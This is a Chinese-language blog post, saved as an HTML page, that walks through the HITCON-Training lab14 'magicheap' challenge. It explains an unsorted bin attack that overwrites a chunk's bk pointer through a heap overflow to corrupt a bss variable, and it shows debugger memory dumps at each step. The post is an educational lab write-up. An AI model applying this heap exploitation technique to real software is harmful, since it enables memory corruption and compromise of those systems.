<!DOCTYPE html>
<html lang="en">
	<head>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
		<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
		<title>magicheap（unsorted_bin_attack) - Yuuoniy&#39;s blog</title>
		
		<meta name="description" content="题目链接：
https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab14
首先分析程序，存在任意长度堆溢出，我们的目的是覆盖 bss 段的 magic 变量，使其大于 0x1305, 很容易想到 unsorted bin attack， 该技术达到的效果就是写 unsorted_chunks (av) 到任意地址，而这个值是比较大的。
我会着重展示内存的变化：
bk 是指向 chunk 的 pre_size 的地方的，而我们的 target address 对应的是 fake chunk 的 fd 的地方。
所以 bk = target_address-0x10
我们直接利用堆溢出，将 unsorted bin 链表中的第一个 chunk 的bk，从而malloc 堆块的时候就能达到 bk 写 unsorted bin 链表头部值的效果。
 首先 malloc 三个 chunk，分别问 chunk 0, chunk1,chunk2:  gef➤ heap chunks Chunk(addr=0xa1e010, size=0x30, flags=PREV_INUSE) [0x0000000000a1e010 61 61 61 61 0a 00 00 00 00 00 00 00 00 00 00 00 aaaa.">
		<meta name="author" content="">
		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
		
		<link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
		
		<link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
		<link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
		<meta name="generator" content="Hugo 0.76.5" />
		
		
		
		<script>
			function setTheme() {
				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
					document.body.classList.add('dark');
					return;
				}
				
				let date = new Date();
				let time = date.getTime();
				let sunrise = date.setHours(7, 00); 
				let sunset = date.setHours(20, 00); 

				if (time < sunrise || time > sunset)
					document.body.classList.add('dark');
			}
			
		</script>
		
	</head>
	<body class="single">
		
		<script>
			setTheme();
			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
		</script>
		
		
		<header class="header">
			<nav class="nav">
				<p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
				<ul class="menu">
					<li>
						<a href="/posts/">Posts</a>
					</li>
					<li>
						<a href="/tags/">Tags</a>
					</li>
					<li>
						<a href="/about/">About</a>
					</li>
					<li>
						<a href="/index.xml">RSS</a>
					</li>
				</ul>
			</nav>
		</header>
		<main class="main">


<article class="post-single">
	<header class="post-header">

		<h1 class="post-title">magicheap（unsorted_bin_attack)</h1>
		<div class="post-meta">September 19, 2019</div>
		
		
	</header>
	<div class="toc"></div><div class="post-content"><p>题目链接：</p>
<p><a href="https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab14">https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab14</a></p>
<p>首先分析程序，存在任意长度堆溢出，我们的目的是覆盖 bss 段的 magic 变量，使其大于 0x1305, 很容易想到 unsorted bin attack， 该技术达到的效果就是写 unsorted_chunks (av) 到任意地址，而这个值是比较大的。</p>
<p>我会着重展示内存的变化：</p>
<p>bk 是指向 chunk 的 pre_size 的地方的，而我们的 target address 对应的是 fake chunk 的 fd 的地方。</p>
<p>所以  bk = target_address-0x10</p>
<p>我们直接利用堆溢出，将 unsorted bin 链表中的第一个 chunk 的bk，从而malloc 堆块的时候就能达到 bk 写 unsorted bin 链表头部值的效果。</p>
<ol>
<li>首先 malloc 三个 chunk，分别问 chunk 0, chunk1,chunk2:</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>  heap chunks
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e010</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x30</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x0000000000a1e010</span>     <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">0</span>a <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     aaaa<span style="color:#f92672">............</span>]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e040</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x0000000000a1e040</span>     <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">5</span>b db <span style="color:#ae81ff">87</span> c9 <span style="color:#ae81ff">7</span>f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">5</span>b db <span style="color:#ae81ff">87</span> c9 <span style="color:#ae81ff">7</span>f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     x[<span style="color:#f92672">......</span>x[<span style="color:#f92672">......</span>]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e0d0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x30</span>, flags<span style="color:#f92672">=</span>)
    [<span style="color:#ae81ff">0x0000000000a1e0d0</span>     <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">0</span>a <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     cccc<span style="color:#f92672">............</span>]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e100</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x20f10</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)  <span style="color:#960050;background-color:#1e0010">←</span>  top chunk
</code></pre></div><p>chunk0 用来写，chunk1 用来free 后放入 unsorted bin 链表，所以大小要大于 fastbin 的最大值，chunk 2 防止 free 1 时</p>
<ol start="2">
<li>接下来我们 free chunk 1, chunk 1 放入 unsorted bin 链表</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">+</span>] unsorted_bins[<span style="color:#ae81ff">0</span>]: fw<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e030</span>, bk<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e030</span>
 <span style="color:#960050;background-color:#1e0010">→</span>   Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0xa1e040</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
</code></pre></div><p>此时 chunk 1 的内容：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0xa1e040</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0xa1e030</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
<span style="color:#ae81ff">0xa1e040</span>:	<span style="color:#ae81ff">0x00007fc987db5b78</span>	<span style="color:#ae81ff">0x00007fc987db5b78</span>
<span style="color:#ae81ff">0xa1e050</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0xa1e060</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0xa1e070</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0xa1e080</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0xa1e090</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0xa1e0a0</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>

</code></pre></div><ol start="3">
<li>接下来，利用堆溢出漏洞写chunk0, 覆盖 chunk1 中的 bk 指针。</li>
</ol>
<p>此时chunk1的内容,已经成功修改 bk 指针</p>
<pre><code>gef➤  x/16gx 0xa1e040-0x10
0xa1e030:	0x0000000000000000	0x0000000000000091
0xa1e040:	0x0000000000000000	0x00000000006020b0
0xa1e050:	0x0000000000000000	0x0000000000000000
0xa1e060:	0x0000000000000000	0x0000000000000000
</code></pre><p>此时 magic 的值：</p>
<pre><code>gef➤  x/16gx 0x00000000006020b0
0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007fc987db58e0	0x0000000000000000
0x6020c0 &lt;magic&gt;:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0 &lt;heaparray&gt;:	0x0000000000a1e010	0x0000000000000000
</code></pre><p>看，此时 unsorted bin 的 bk 值</p>
<pre><code>unsorted_bins[0]: fw=0xa1e030, bk=0x6020b0
</code></pre><ol start="4">
<li>接下来malloc,刚好重新分配 chunk1 给我们。从 unsorted bin 取出，然后bk 就会指向 unsorted bin 的头，从而修改 magic 的值，是不是很简单。</li>
</ol>
<p>从、此时 magic 的值也被修改了：</p>
<pre><code>gef➤  x/16gx 0x6020b0
0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007fc987db58e0	0x0000000000000000
0x6020c0 &lt;magic&gt;:	0x00007fc987db5b78	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
</code></pre><p>这个值就是 unsorted bin 链表的头部，也就是 main_arena+88。</p>
<p>结束了~</p>
<p>题目相关内容可以</p>
<p>四步：</p>
<ul>
<li>malloc three chunks</li>
<li>free chunk1</li>
<li>overwrite bk of chunk1</li>
<li>malloc a chunk, the size is same with chunk1</li>
</ul>
<p>我们再来回顾一下这道题：</p>
<ul>
<li>首先漏洞是edit函数的堆溢出</li>
<li>其次add delete edit 基本都没有太多限制，很方便我们执行 attack</li>
<li>最终目的是改写bss段的某个值。</li>
</ul>
<p>由此想到每道题的最终目的都是不一样的。</p>
<p>其实边写边觉得&hellip;. 这些东西都写烂了吧，不过我要想总结出新的东西，还是需要耐着性子重新过一遍的。</p>
</div>
	<script>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		function mashiroToc(mashiro) {
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    if (mashiro) {
        var id = 1;
        $(".post-content").children("h1,h2,h3,h4,h5").each(function() {
            
            var hyphenated = "mm-" + id;
            $(this).attr('id', hyphenated);
            id++;
        });
        
        tocbot.init({
            tocSelector: '.toc',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            positionFixedSelector: ".toc",
            scrollEndCallback: function (e) {
                window.scrollTo(window.scrollX, window.scrollY - 80);
            },
        });
    }
}
	mashiroToc(true);
	</script>
	
</article></main>
<footer class="footer">
	<span>
		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
		
	</span>
	<span>&middot;</span>
	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>
</body>
</html>
